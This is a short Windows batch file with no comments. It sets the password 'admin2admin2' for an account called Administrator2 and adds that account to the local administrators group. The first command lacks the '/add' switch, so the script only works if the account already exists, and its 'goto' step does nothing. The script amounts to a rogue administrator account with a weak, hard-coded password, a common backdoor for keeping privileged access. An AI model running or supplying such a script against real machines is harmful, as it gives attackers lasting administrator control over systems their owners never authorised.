@echo off
net user Administrator2 admin2admin2
goto admin
:admin
net localgroup administrators Administrator2 /add
pause